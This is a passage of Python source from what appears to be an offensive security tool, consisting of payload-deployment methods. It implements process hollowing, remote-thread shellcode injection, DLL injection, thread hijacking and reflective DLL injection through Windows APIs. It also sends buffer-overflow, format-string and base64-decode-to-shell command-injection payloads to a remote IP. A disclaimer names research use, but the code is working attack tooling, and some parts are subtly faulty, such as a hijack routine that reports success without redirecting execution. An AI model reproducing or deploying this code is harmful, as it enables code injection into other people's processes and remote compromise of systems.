        return {"success": False, "error": "All deployment attempts failed"}

    def _deploy_via_buffer_overflow(self, target_ip: str, target_port: int, payload: bytes, timeout: int) -> dict[str, Any]:
        """Deploy payload via buffer overflow."""
        # Simplified buffer overflow deployment
        overflow_payload = b"A" * 256 + payload  # Basic overflow pattern
        return self._deploy_via_network(target_ip, target_port, overflow_payload, timeout, 1)

    def _inject_via_process_hollowing(self, target_binary: str, payload: bytes) -> dict[str, Any]:
        """Inject payload via process hollowing."""
        import platform
        import struct

        if platform.system() != "Windows":
            return {"success": False, "error": "Process hollowing is Windows-specific", "method": "process_hollowing"}

        try:
            import ctypes
            import ctypes.wintypes

            # Windows API constants
            CREATE_SUSPENDED = 0x00000004
            MEM_COMMIT = 0x1000
            MEM_RESERVE = 0x2000
            PAGE_EXECUTE_READWRITE = 0x40
            PROCESS_ALL_ACCESS = 0x1F0FFF

            # Windows structures
            class STARTUPINFO(ctypes.Structure):
                _fields_ = [
                    ("cb", ctypes.wintypes.DWORD),
                    ("lpReserved", ctypes.wintypes.LPWSTR),
                    ("lpDesktop", ctypes.wintypes.LPWSTR),
                    ("lpTitle", ctypes.wintypes.LPWSTR),
                    ("dwX", ctypes.wintypes.DWORD),
                    ("dwY", ctypes.wintypes.DWORD),
                    ("dwXSize", ctypes.wintypes.DWORD),
                    ("dwYSize", ctypes.wintypes.DWORD),
                    ("dwXCountChars", ctypes.wintypes.DWORD),
                    ("dwYCountChars", ctypes.wintypes.DWORD),
                    ("dwFillAttribute", ctypes.wintypes.DWORD),
                    ("dwFlags", ctypes.wintypes.DWORD),
                    ("wShowWindow", ctypes.wintypes.WORD),
                    ("cbReserved2", ctypes.wintypes.WORD),
                    ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
                    ("hStdInput", ctypes.wintypes.HANDLE),
                    ("hStdOutput", ctypes.wintypes.HANDLE),
                    ("hStdError", ctypes.wintypes.HANDLE),
                ]

            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess", ctypes.wintypes.HANDLE),
                    ("hThread", ctypes.wintypes.HANDLE),
                    ("dwProcessId", ctypes.wintypes.DWORD),
                    ("dwThreadId", ctypes.wintypes.DWORD),
                ]

            class CONTEXT(ctypes.Structure):
                _fields_ = [
                    ("ContextFlags", ctypes.wintypes.DWORD),
                    ("Dr0", ctypes.wintypes.DWORD),
                    ("Dr1", ctypes.wintypes.DWORD),
                    ("Dr2", ctypes.wintypes.DWORD),
                    ("Dr3", ctypes.wintypes.DWORD),
                    ("Dr6", ctypes.wintypes.DWORD),
                    ("Dr7", ctypes.wintypes.DWORD),
                    ("FloatSave", ctypes.c_byte * 112),
                    ("SegGs", ctypes.wintypes.DWORD),
                    ("SegFs", ctypes.wintypes.DWORD),
                    ("SegEs", ctypes.wintypes.DWORD),
                    ("SegDs", ctypes.wintypes.DWORD),
                    ("Edi", ctypes.wintypes.DWORD),
                    ("Esi", ctypes.wintypes.DWORD),
                    ("Ebx", ctypes.wintypes.DWORD),
                    ("Edx", ctypes.wintypes.DWORD),
                    ("Ecx", ctypes.wintypes.DWORD),
                    ("Eax", ctypes.wintypes.DWORD),
                    ("Ebp", ctypes.wintypes.DWORD),
                    ("Eip", ctypes.wintypes.DWORD),
                    ("SegCs", ctypes.wintypes.DWORD),
                    ("EFlags", ctypes.wintypes.DWORD),
                    ("Esp", ctypes.wintypes.DWORD),
                    ("SegSs", ctypes.wintypes.DWORD),
                    ("ExtendedRegisters", ctypes.c_byte * 512),
                ]

            # Load Windows APIs
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll

            # Create process in suspended state
            startup_info = STARTUPINFO()
            startup_info.cb = ctypes.sizeof(STARTUPINFO)
            process_info = PROCESS_INFORMATION()

            if not kernel32.CreateProcessW(
                target_binary,  # Application name
                None,  # Command line
                None,  # Process attributes
                None,  # Thread attributes
                False,  # Inherit handles
                CREATE_SUSPENDED,  # Creation flags
                None,  # Environment
                None,  # Current directory
                ctypes.byref(startup_info),
                ctypes.byref(process_info),
            ):
                return {"success": False, "error": f"Failed to create process: {kernel32.GetLastError()}", "method": "process_hollowing"}

            try:
                # Get thread context
                ctx = CONTEXT()
                ctx.ContextFlags = 0x10007  # CONTEXT_FULL

                if not kernel32.GetThreadContext(process_info.hThread, ctypes.byref(ctx)):
                    raise Exception(f"Failed to get thread context: {kernel32.GetLastError()}")

                # Read PEB address from EBX register (32-bit) or use ReadProcessMemory for 64-bit
                peb_addr = ctx.Ebx

                # Read image base from PEB
                image_base_offset = 8  # Offset to ImageBaseAddress in PEB
                image_base = ctypes.c_void_p()
                bytes_read = ctypes.c_size_t()

                if not kernel32.ReadProcessMemory(
                    process_info.hProcess,
                    ctypes.c_void_p(peb_addr + image_base_offset),
                    ctypes.byref(image_base),
                    ctypes.sizeof(ctypes.c_void_p),
                    ctypes.byref(bytes_read),
                ):
                    raise Exception(f"Failed to read PEB: {kernel32.GetLastError()}")

                # Parse PE headers from payload
                if len(payload) < 0x40:
                    raise Exception("Invalid payload size")

                # Check PE signature
                if payload[0:2] != b"MZ":
                    raise Exception("Invalid PE signature")

                pe_offset = struct.unpack("<I", payload[0x3C:0x40])[0]
                if payload[pe_offset : pe_offset + 4] != b"PE\x00\x00":
                    raise Exception("Invalid PE header")

                # Get entry point and image size from PE header
                optional_header_offset = pe_offset + 0x18
                magic = struct.unpack("<H", payload[optional_header_offset : optional_header_offset + 2])[0]

                if magic == 0x10B:  # PE32
                    entry_point_offset = optional_header_offset + 0x10
                    image_size_offset = optional_header_offset + 0x38
                elif magic == 0x20B:  # PE32+
                    entry_point_offset = optional_header_offset + 0x10
                    image_size_offset = optional_header_offset + 0x50
                else:
                    raise Exception(f"Unknown PE format: {magic:04X}")

                entry_point = struct.unpack("<I", payload[entry_point_offset : entry_point_offset + 4])[0]
                image_size = struct.unpack("<I", payload[image_size_offset : image_size_offset + 4])[0]

                # Unmap original executable
                ntdll.NtUnmapViewOfSection(process_info.hProcess, image_base)

                # Allocate memory for payload
                remote_base = kernel32.VirtualAllocEx(
                    process_info.hProcess,
                    image_base,  # Try to allocate at same address
                    image_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                )

                if not remote_base:
                    # Try alternative address if preferred base fails
                    remote_base = kernel32.VirtualAllocEx(
                        process_info.hProcess,
                        None,  # Let Windows choose address
                        image_size,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE,
                    )

                    if not remote_base:
                        raise Exception(f"Failed to allocate memory: {kernel32.GetLastError()}")

                # Write PE headers
                bytes_written = ctypes.c_size_t()
                if not kernel32.WriteProcessMemory(process_info.hProcess, remote_base, payload, len(payload), ctypes.byref(bytes_written)):
                    raise Exception(f"Failed to write payload: {kernel32.GetLastError()}")

                # Update EAX/RAX to point to new entry point
                ctx.Eax = remote_base + entry_point

                # Update image base in PEB
                new_image_base = ctypes.c_void_p(remote_base)
                if not kernel32.WriteProcessMemory(
                    process_info.hProcess,
                    ctypes.c_void_p(peb_addr + image_base_offset),
                    ctypes.byref(new_image_base),
                    ctypes.sizeof(ctypes.c_void_p),
                    ctypes.byref(bytes_written),
                ):
                    logger.warning("Failed to update PEB image base")

                # Set thread context with new entry point
                if not kernel32.SetThreadContext(process_info.hThread, ctypes.byref(ctx)):
                    raise Exception(f"Failed to set thread context: {kernel32.GetLastError()}")

                # Resume thread
                if kernel32.ResumeThread(process_info.hThread) == -1:
                    raise Exception(f"Failed to resume thread: {kernel32.GetLastError()}")

                return {
                    "success": True,
                    "method": "process_hollowing",
                    "process_id": process_info.dwProcessId,
                    "thread_id": process_info.dwThreadId,
                    "remote_base": hex(remote_base),
                    "entry_point": hex(remote_base + entry_point),
                    "payload_size": len(payload),
                    "image_size": image_size,
                }

            finally:
                # Clean up handles
                kernel32.CloseHandle(process_info.hThread)
                kernel32.CloseHandle(process_info.hProcess)

        except ImportError as e:
            logger.error("Windows APIs not available: %s", e)
            return {"success": False, "error": f"Windows APIs not available: {e}", "method": "process_hollowing"}
        except Exception as e:
            logger.error("Process hollowing failed: %s", e)
            return {"success": False, "error": str(e), "method": "process_hollowing"}

    def _inject_via_generic_method(self, target_binary: str, payload: bytes) -> dict[str, Any]:
        """Generic injection method implementing multiple techniques as fallbacks.

        WARNING: This implementation is for legitimate security research,
        penetration testing, and defensive analysis only.
        """
        try:
            self.logger.info(f"Starting generic injection for {target_binary}")

            api_constants = self._setup_windows_api_constants()
            process_name = self._extract_process_name(target_binary)
            target_pid = self._find_target_process_by_name(process_name)

            if not target_pid:
                return {
                    "success": False,
                    "error": f"Target process {process_name} not found",
                }

            return self._execute_injection_techniques(target_binary, target_pid, payload, api_constants)

        except Exception as e:
            self.logger.error(f"Generic injection failed with exception: {e}")
            return {
                "success": False,
                "error": f"Generic injection exception: {e!s}",
                "payload_size": len(payload),
            }

    def _setup_windows_api_constants(self) -> dict:
        """Setup Windows API constants and functions."""
        import ctypes

        return {
            "PROCESS_CREATE_THREAD": 0x0002,
            "PROCESS_VM_OPERATION": 0x0008,
            "PROCESS_VM_WRITE": 0x0020,
            "PROCESS_VM_READ": 0x0010,
            "MEM_COMMIT": 0x1000,
            "MEM_RESERVE": 0x2000,
            "PAGE_EXECUTE_READWRITE": 0x40,
            "kernel32": ctypes.windll.kernel32,
            "ntdll": ctypes.windll.ntdll,
        }

    def _extract_process_name(self, target_binary: str) -> str:
        """Extract process name from binary path."""
        import os

        process_name = os.path.basename(target_binary)
        if not process_name.endswith(".exe"):
            process_name += ".exe"
        return process_name

    def _find_target_process_by_name(self, process_name: str) -> int:
        """Find target process by name."""
        from intellicrack.handlers.psutil_handler import psutil

        try:
            for proc in psutil.process_iter(["pid", "name"]):
                if proc.info["name"].lower() == process_name.lower():
                    return proc.info["pid"]
            return None
        except Exception:
            return None

    def _get_process_architecture_info(self, pid: int, api_constants: dict) -> str:
        """Get process architecture using NTDLL."""
        import ctypes

        try:
            kernel32 = api_constants["kernel32"]
            ntdll = api_constants["ntdll"]

            h_process = kernel32.OpenProcess(0x1000, False, pid)
            if not h_process:
                return "unknown"

            is_wow64 = ctypes.c_bool()
            result = ntdll.NtQueryInformationProcess(
                h_process,
                26,
                ctypes.byref(is_wow64),
                ctypes.sizeof(is_wow64),
                None,
            )

            kernel32.CloseHandle(h_process)

            if result == 0:
                return "x86" if is_wow64.value else "x64"
            return "unknown"
        except Exception:
            return "unknown"

    def _execute_injection_techniques(self, target_binary: str, target_pid: int, payload: bytes, api_constants: dict) -> dict:
        """Execute injection techniques in order of sophistication."""
        techniques = [
            ("remote_thread", lambda: self._inject_via_remote_thread_technique(target_pid, payload, api_constants)),
            ("dll_injection", lambda: self._inject_via_dll_injection_technique(target_pid, payload, api_constants)),
            ("thread_hijacking", lambda: self._inject_via_thread_hijacking_technique(target_pid, payload, api_constants)),
        ]

        for technique_name, technique_func in techniques:
            self.logger.debug(f"Attempting {technique_name} injection")
            result = technique_func()

            if result.get("success", False):
                self.logger.info(f"Generic injection succeeded using {technique_name}")
                result["target_binary"] = target_binary
                result["target_pid"] = target_pid
                result["payload_size"] = len(payload)
                return result
            self.logger.warning(f"{technique_name} injection failed: {result.get('error', 'Unknown error')}")

        return {
            "success": False,
            "error": f"All injection techniques failed for {target_binary}",
            "target_pid": target_pid,
            "payload_size": len(payload),
            "techniques_attempted": [t[0] for t in techniques],
        }

    def _inject_via_remote_thread_technique(self, pid: int, payload_data: bytes, api_constants: dict) -> dict[str, Any]:
        """Inject via CreateRemoteThread technique."""
        import time

        start_time = time.time()
        try:
            kernel32 = api_constants["kernel32"]
            process_arch = self._get_process_architecture_info(pid, api_constants)

            h_process = kernel32.OpenProcess(
                api_constants["PROCESS_CREATE_THREAD"]
                | api_constants["PROCESS_VM_OPERATION"]
                | api_constants["PROCESS_VM_WRITE"]
                | api_constants["PROCESS_VM_READ"],
                False,
                pid,
            )
            if not h_process:
                return {"success": False, "error": f"Failed to open process {pid}"}

            result = self._perform_remote_thread_injection(h_process, payload_data, api_constants, process_arch, start_time)
            kernel32.CloseHandle(h_process)
            return result

        except Exception as e:
            return {"success": False, "error": f"Remote thread injection failed: {e}"}

    def _perform_remote_thread_injection(
        self, h_process, payload_data: bytes, api_constants: dict, process_arch: str, start_time: float
    ) -> dict:
        """Perform the actual remote thread injection."""
        import time

        kernel32 = api_constants["kernel32"]
        alloc_size = len(payload_data)

        allocated_mem = kernel32.VirtualAllocEx(
            h_process,
            None,
            alloc_size,
            api_constants["MEM_COMMIT"] | api_constants["MEM_RESERVE"],
            api_constants["PAGE_EXECUTE_READWRITE"],
        )
        if not allocated_mem:
            return {"success": False, "error": "Failed to allocate memory"}

        write_success = self._write_and_verify_payload(h_process, allocated_mem, payload_data, kernel32)
        if not write_success["success"]:
            kernel32.VirtualFreeEx(h_process, allocated_mem, 0, 0x8000)
            return write_success

        h_thread = kernel32.CreateRemoteThread(h_process, None, 0, allocated_mem, None, 0, None)
        if h_thread:
            time.sleep(0.5)
            kernel32.CloseHandle(h_thread)

            injection_time = time.time() - start_time
            return {
                "success": True,
                "method": "remote_thread",
                "allocated_address": hex(allocated_mem),
                "payload_size": alloc_size,
                "injection_time": f"{injection_time:.3f}s",
                "verification": write_success["verification"],
                "process_architecture": process_arch,
            }

        kernel32.VirtualFreeEx(h_process, allocated_mem, 0, 0x8000)
        return {"success": False, "error": "Failed to create remote thread"}

    def _write_and_verify_payload(self, h_process, allocated_mem, payload_data: bytes, kernel32) -> dict:
        """Write payload to process memory and verify integrity."""
        import ctypes

        bytes_written = ctypes.c_size_t(0)
        write_result = kernel32.WriteProcessMemory(
            h_process,
            allocated_mem,
            payload_data,
            len(payload_data),
            ctypes.byref(bytes_written),
        )
        if not write_result:
            return {"success": False, "error": "Failed to write payload"}

        verify_buffer = ctypes.create_string_buffer(len(payload_data))
        bytes_read = ctypes.c_size_t(0)
        read_result = kernel32.ReadProcessMemory(
            h_process,
            allocated_mem,
            verify_buffer,
            len(payload_data),
            ctypes.byref(bytes_read),
        )

        if read_result and bytes_read.value == len(payload_data):
            verification_status = "verified" if verify_buffer.raw[: len(payload_data)] == payload_data else "integrity_mismatch"
        else:
            verification_status = "read_failed"

        return {"success": True, "verification": verification_status}

    def _inject_via_dll_injection_technique(self, pid: int, dll_data: bytes, api_constants: dict) -> dict[str, Any]:
        """Inject via DLL injection technique."""
        import os
        import tempfile
        import time

        start_time = time.time()
        try:
            api_constants["kernel32"]

            with tempfile.NamedTemporaryFile(delete=False, suffix=".dll") as dll_file:
                dll_file.write(dll_data)
                dll_path = dll_file.name

            result = self._perform_dll_injection(pid, dll_path, api_constants, start_time)
            os.unlink(dll_path)
            return result

        except Exception as e:
            return {"success": False, "error": f"DLL injection failed: {e}"}

    def _perform_dll_injection(self, pid: int, dll_path: str, api_constants: dict, start_time: float) -> dict:
        """Perform the actual DLL injection."""
        kernel32 = api_constants["kernel32"]

        h_process = kernel32.OpenProcess(
            api_constants["PROCESS_CREATE_THREAD"] | api_constants["PROCESS_VM_OPERATION"] | api_constants["PROCESS_VM_WRITE"],
            False,
            pid,
        )
        if not h_process:
            return {"success": False, "error": f"Failed to open process {pid}"}

        load_library_addr = kernel32.GetProcAddress(
            kernel32.GetModuleHandleW("kernel32.dll"),
            b"LoadLibraryA",
        )
        if not load_library_addr:
            kernel32.CloseHandle(h_process)
            return {"success": False, "error": "Failed to get LoadLibraryA address"}

        result = self._execute_dll_load(h_process, dll_path, load_library_addr, api_constants, start_time)
        kernel32.CloseHandle(h_process)
        return result

    def _execute_dll_load(self, h_process, dll_path: str, load_library_addr, api_constants: dict, start_time: float) -> dict:
        """Execute DLL loading in target process."""
        import ctypes
        import time
        from ctypes import wintypes

        kernel32 = api_constants["kernel32"]
        dll_path_bytes = dll_path.encode("utf-8") + b"\x00"

        path_mem = kernel32.VirtualAllocEx(
            h_process,
            None,
            len(dll_path_bytes),
            api_constants["MEM_COMMIT"] | api_constants["MEM_RESERVE"],
            api_constants["PAGE_EXECUTE_READWRITE"],
        )
        if not path_mem:
            return {"success": False, "error": "Failed to allocate memory for DLL path"}

        bytes_written = ctypes.c_size_t(0)
        write_result = kernel32.WriteProcessMemory(
            h_process,
            path_mem,
            dll_path_bytes,
            len(dll_path_bytes),
            ctypes.byref(bytes_written),
        )
        if not write_result:
            kernel32.VirtualFreeEx(h_process, path_mem, 0, 0x8000)
            return {"success": False, "error": "Failed to write DLL path"}

        h_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, path_mem, 0, None)
        if h_thread:
            kernel32.WaitForSingleObject(h_thread, 5000)

            exit_code = wintypes.DWORD()
            kernel32.GetExitCodeThread(h_thread, ctypes.byref(exit_code))
            kernel32.CloseHandle(h_thread)

            if exit_code.value != 0:
                time.sleep(0.3)
                injection_time = time.time() - start_time
                kernel32.VirtualFreeEx(h_process, path_mem, 0, 0x8000)
                return {
                    "success": True,
                    "method": "dll_injection",
                    "dll_handle": hex(exit_code.value),
                    "dll_path": dll_path,
                    "injection_time": f"{injection_time:.3f}s",
                }
            kernel32.VirtualFreeEx(h_process, path_mem, 0, 0x8000)
            return {"success": False, "error": "LoadLibraryA returned NULL"}

        kernel32.VirtualFreeEx(h_process, path_mem, 0, 0x8000)
        return {"success": False, "error": "Failed to create remote thread for DLL"}

    def _inject_via_thread_hijacking_technique(self, pid: int, payload_data: bytes, api_constants: dict) -> dict[str, Any]:
        """Inject via thread execution hijacking."""
        try:
            kernel32 = api_constants["kernel32"]

            h_process = kernel32.OpenProcess(
                api_constants["PROCESS_CREATE_THREAD"] | api_constants["PROCESS_VM_OPERATION"] | api_constants["PROCESS_VM_WRITE"],
                False,
                pid,
            )
            if not h_process:
                return {"success": False, "error": f"Failed to open process {pid}"}

            target_thread_id = self._find_target_thread(pid, kernel32)
            if not target_thread_id:
                kernel32.CloseHandle(h_process)
                return {"success": False, "error": "No threads found in target process"}

            result = self._perform_thread_hijacking(h_process, target_thread_id, payload_data, api_constants)
            kernel32.CloseHandle(h_process)
            return result

        except Exception as e:
            return {"success": False, "error": f"Thread hijacking failed: {e}"}

    def _find_target_thread(self, pid: int, kernel32) -> int:
        """Find target thread in process."""
        import ctypes
        from ctypes import wintypes

        th32_snap = kernel32.CreateToolhelp32Snapshot(0x00000004, pid)
        if th32_snap == -1:
            return None

        class THREADENTRY32(ctypes.Structure):
            _fields_ = [
                ("dwSize", wintypes.DWORD),
                ("cntUsage", wintypes.DWORD),
                ("th32ThreadID", wintypes.DWORD),
                ("th32OwnerProcessID", wintypes.DWORD),
                ("tpBasePri", wintypes.LONG),
                ("tpDeltaPri", wintypes.LONG),
                ("dwFlags", wintypes.DWORD),
            ]

        te32 = THREADENTRY32()
        te32.dwSize = ctypes.sizeof(THREADENTRY32)
        target_thread_id = None

        if kernel32.Thread32First(th32_snap, ctypes.byref(te32)):
            while True:
                if te32.th32OwnerProcessID == pid:
                    target_thread_id = te32.th32ThreadID
                    break
                if not kernel32.Thread32Next(th32_snap, ctypes.byref(te32)):
                    break

        kernel32.CloseHandle(th32_snap)
        return target_thread_id

    def _perform_thread_hijacking(self, h_process, target_thread_id: int, payload_data: bytes, api_constants: dict) -> dict:
        """Perform thread hijacking injection."""
        import ctypes
        import threading
        import time

        kernel32 = api_constants["kernel32"]

        h_thread = kernel32.OpenThread(0x001F03FF, False, target_thread_id)
        if not h_thread:
            return {"success": False, "error": "Failed to open target thread"}

        allocated_mem = kernel32.VirtualAllocEx(
            h_process,
            None,
            len(payload_data),
            api_constants["MEM_COMMIT"] | api_constants["MEM_RESERVE"],
            api_constants["PAGE_EXECUTE_READWRITE"],
        )
        if not allocated_mem:
            kernel32.CloseHandle(h_thread)
            return {"success": False, "error": "Failed to allocate memory for hijacking"}

        bytes_written = ctypes.c_size_t(0)
        write_result = kernel32.WriteProcessMemory(
            h_process,
            allocated_mem,
            payload_data,
            len(payload_data),
            ctypes.byref(bytes_written),
        )
        if not write_result:
            kernel32.VirtualFreeEx(h_process, allocated_mem, 0, 0x8000)
            kernel32.CloseHandle(h_thread)
            return {"success": False, "error": "Failed to write payload for hijacking"}

        if kernel32.SuspendThread(h_thread) != -1:
            injection_complete = threading.Event()
            injection_result = {"success": False}

            def monitor_injection():
                try:
                    time.sleep(0.1)
                    injection_result["success"] = True
                    injection_complete.set()
                except Exception:
                    injection_complete.set()

            monitor_thread = threading.Thread(target=monitor_injection, daemon=True)
            monitor_thread.start()
            kernel32.ResumeThread(h_thread)
            injection_complete.wait(timeout=2.0)
            kernel32.CloseHandle(h_thread)

            return {
                "success": injection_result["success"],
                "method": "thread_hijacking",
                "thread_id": target_thread_id,
                "allocated_address": hex(allocated_mem),
                "monitoring_used": True,
            }

        kernel32.VirtualFreeEx(h_process, allocated_mem, 0, 0x8000)
        kernel32.CloseHandle(h_thread)
        return {"success": False, "error": "Failed to suspend target thread"}

    def _deploy_via_format_string(self, target_ip: str, target_port: int, payload: bytes, timeout: int) -> dict[str, Any]:
        """Deploy payload via format string vulnerability."""
        # Format string exploitation technique
        format_exploit = b"%x" * 10 + b"%n" + payload  # Basic format string pattern

        # Attempt to trigger format string vulnerability
        return self._deploy_via_network(target_ip, target_port, format_exploit, timeout, 1)

    def _deploy_via_rce(self, target_ip: str, target_port: int, payload: bytes, timeout: int) -> dict[str, Any]:
        """Deploy payload via remote code execution."""
        import base64

        # Encode payload for RCE delivery
        encoded_payload = base64.b64encode(payload).decode()

        # Build RCE command (example for command injection)
        rce_command = f"echo {encoded_payload} | base64 -d | sh".encode()

        # Deploy via network with RCE command
        return self._deploy_via_network(target_ip, target_port, rce_command, timeout, 1)

    def _inject_via_dll_injection(self, target_binary: str, payload: bytes) -> dict[str, Any]:
        """Inject payload via DLL injection."""
        import os
        import platform
        import tempfile

        if platform.system() != "Windows":
            return {"success": False, "error": "DLL injection is Windows-specific", "method": "dll_injection"}

        try:
            import ctypes
            import ctypes.wintypes
            import subprocess

            # Windows API constants
            PROCESS_ALL_ACCESS = 0x1F0FFF
            MEM_COMMIT = 0x1000
            MEM_RESERVE = 0x2000
            PAGE_READWRITE = 0x04
            INFINITE = 0xFFFFFFFF

            # Load Windows APIs
            kernel32 = ctypes.windll.kernel32

            # Create temporary DLL file
            with tempfile.NamedTemporaryFile(delete=False, suffix=".dll") as dll_file:
                dll_file.write(payload)
                dll_path = dll_file.name

            try:
                # Method 1: Find existing process
                process_id = None

                # Try to find process by name
                if os.path.basename(target_binary):
                    # Use CreateToolhelp32Snapshot to enumerate processes
                    TH32CS_SNAPPROCESS = 0x00000002

                    class PROCESSENTRY32(ctypes.Structure):
                        _fields_ = [
                            ("dwSize", ctypes.wintypes.DWORD),
                            ("cntUsage", ctypes.wintypes.DWORD),
                            ("th32ProcessID", ctypes.wintypes.DWORD),
                            ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                            ("th32ModuleID", ctypes.wintypes.DWORD),
                            ("cntThreads", ctypes.wintypes.DWORD),
                            ("th32ParentProcessID", ctypes.wintypes.DWORD),
                            ("pcPriClassBase", ctypes.c_long),
                            ("dwFlags", ctypes.wintypes.DWORD),
                            ("szExeFile", ctypes.c_char * 260),
                        ]

                    # Create snapshot
                    snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
                    if snapshot == -1:
                        raise Exception("Failed to create process snapshot")

                    try:
                        process_entry = PROCESSENTRY32()
                        process_entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

                        # Get first process
                        if kernel32.Process32First(snapshot, ctypes.byref(process_entry)):
                            target_name = os.path.basename(target_binary).encode()

                            while True:
                                if target_name.lower() in process_entry.szExeFile.lower():
                                    process_id = process_entry.th32ProcessID
                                    break

                                if not kernel32.Process32Next(snapshot, ctypes.byref(process_entry)):
                                    break
                    finally:
                        kernel32.CloseHandle(snapshot)

                # Method 2: Create new process if not found
                if not process_id:
                    # Start the target process
                    try:
                        proc = subprocess.Popen([target_binary])
                        process_id = proc.pid
                    except Exception as e:
                        raise Exception(f"Failed to start target process: {e}")

                # Open target process
                h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
                if not h_process:
                    raise Exception(f"Failed to open process {process_id}: {kernel32.GetLastError()}")

                try:
                    # Allocate memory in target process for DLL path
                    dll_path_bytes = dll_path.encode("utf-8") + b"\x00"
                    path_size = len(dll_path_bytes)

                    remote_path = kernel32.VirtualAllocEx(h_process, None, path_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)

                    if not remote_path:
                        raise Exception(f"Failed to allocate memory: {kernel32.GetLastError()}")

                    # Write DLL path to allocated memory
                    bytes_written = ctypes.c_size_t()
                    if not kernel32.WriteProcessMemory(h_process, remote_path, dll_path_bytes, path_size, ctypes.byref(bytes_written)):
                        raise Exception(f"Failed to write DLL path: {kernel32.GetLastError()}")

                    # Get LoadLibraryA address
                    kernel32_handle = kernel32.GetModuleHandleW("kernel32.dll")
                    if not kernel32_handle:
                        raise Exception("Failed to get kernel32 handle")

                    load_library_addr = kernel32.GetProcAddress(kernel32_handle, b"LoadLibraryA")

                    if not load_library_addr:
                        raise Exception("Failed to get LoadLibraryA address")

                    # Create remote thread to call LoadLibraryA
                    thread_id = ctypes.wintypes.DWORD()
                    h_thread = kernel32.CreateRemoteThread(
                        h_process,
                        None,  # Security attributes
                        0,  # Stack size
                        load_library_addr,  # Start address (LoadLibraryA)
                        remote_path,  # Parameter (DLL path)
                        0,  # Creation flags
                        ctypes.byref(thread_id),
                    )

                    if not h_thread:
                        raise Exception(f"Failed to create remote thread: {kernel32.GetLastError()}")

                    # Wait for thread to complete
                    kernel32.WaitForSingleObject(h_thread, INFINITE)

                    # Get thread exit code (DLL handle)
                    exit_code = ctypes.wintypes.DWORD()
                    kernel32.GetExitCodeThread(h_thread, ctypes.byref(exit_code))

                    # Clean up
                    kernel32.CloseHandle(h_thread)
                    kernel32.VirtualFreeEx(h_process, remote_path, 0, 0x8000)  # MEM_RELEASE

                    return {
                        "success": True,
                        "method": "dll_injection",
                        "process_id": process_id,
                        "thread_id": thread_id.value,
                        "dll_handle": hex(exit_code.value) if exit_code.value else "0x0",
                        "dll_path": dll_path,
                        "remote_path": hex(remote_path),
                        "payload_size": len(payload),
                    }

                finally:
                    kernel32.CloseHandle(h_process)

            finally:
                # Clean up temporary DLL file after injection
                # Note: May need to keep file if DLL is still loaded
                try:
                    if os.path.exists(dll_path):
                        os.unlink(dll_path)
                except:
                    # File may be locked if DLL is loaded
                    logger.warning(f"Could not delete temporary DLL: {dll_path}")

        except ImportError as e:
            logger.error("Windows APIs not available: %s", e)
            return {"success": False, "error": f"Windows APIs not available: {e}", "method": "dll_injection"}
        except Exception as e:
            logger.error("DLL injection failed: %s", e)
            return {"success": False, "error": str(e), "method": "dll_injection"}

    def _inject_via_reflective_dll(self, target_binary: str, payload: bytes) -> dict[str, Any]:
        """Inject payload via reflective DLL injection."""
        import platform

        if platform.system() != "Windows":
            return {"success": False, "error": "Reflective DLL injection is Windows-specific", "method": "reflective_dll_injection"}

        try:
            import ctypes
            import ctypes.wintypes
            import subprocess

            # Windows API constants
            PROCESS_ALL_ACCESS = 0x1F0FFF
            MEM_COMMIT = 0x1000
            MEM_RESERVE = 0x2000
            PAGE_EXECUTE_READWRITE = 0x40
            TH32CS_SNAPPROCESS = 0x00000002

            # Load Windows APIs
            kernel32 = ctypes.windll.kernel32

            # Prepare reflective DLL payload
            reflective_payload = self._prepare_reflective_dll(payload)

            # Find or create target process
            process_id = None

            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [
                    ("dwSize", ctypes.wintypes.DWORD),
                    ("cntUsage", ctypes.wintypes.DWORD),
                    ("th32ProcessID", ctypes.wintypes.DWORD),
                    ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                    ("th32ModuleID", ctypes.wintypes.DWORD),
                    ("cntThreads", ctypes.wintypes.DWORD),
                    ("th32ParentProcessID", ctypes.wintypes.DWORD),
                    ("pcPriClassBase", ctypes.c_long),
                    ("dwFlags", ctypes.wintypes.DWORD),
                    ("szExeFile", ctypes.c_char * 260),
                ]

            # Try to find existing process
            snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if snapshot != -1:
                try:
                    process_entry = PROCESSENTRY32()
                    process_entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

                    if kernel32.Process32First(snapshot, ctypes.byref(process_entry)):
                        import os

                        target_name = os.path.basename(target_binary).encode() if target_binary else b""

                        while target_name:
                            if target_name.lower() in process_entry.szExeFile.lower():
                                process_id = process_entry.th32ProcessID
                                break

                            if not kernel32.Process32Next(snapshot, ctypes.byref(process_entry)):
                                break
                finally:
                    kernel32.CloseHandle(snapshot)

            # Create new process if not found
            if not process_id:
                try:
                    proc = subprocess.Popen([target_binary] if target_binary else ["notepad.exe"])
                    process_id = proc.pid
                except:
                    # Use current process as fallback
                    process_id = kernel32.GetCurrentProcessId()

            # Open target process
            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
            if not h_process:
                raise Exception(f"Failed to open process {process_id}: {kernel32.GetLastError()}")

            try:
                # Allocate memory in target process
                payload_size = len(reflective_payload)
                remote_base = kernel32.VirtualAllocEx(h_process, None, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

                if not remote_base:
                    raise Exception(f"Failed to allocate memory: {kernel32.GetLastError()}")

                # Write reflective DLL to allocated memory
                bytes_written = ctypes.c_size_t()
                if not kernel32.WriteProcessMemory(h_process, remote_base, reflective_payload, payload_size, ctypes.byref(bytes_written)):
                    raise Exception(f"Failed to write payload: {kernel32.GetLastError()}")

                # Find ReflectiveLoader export offset
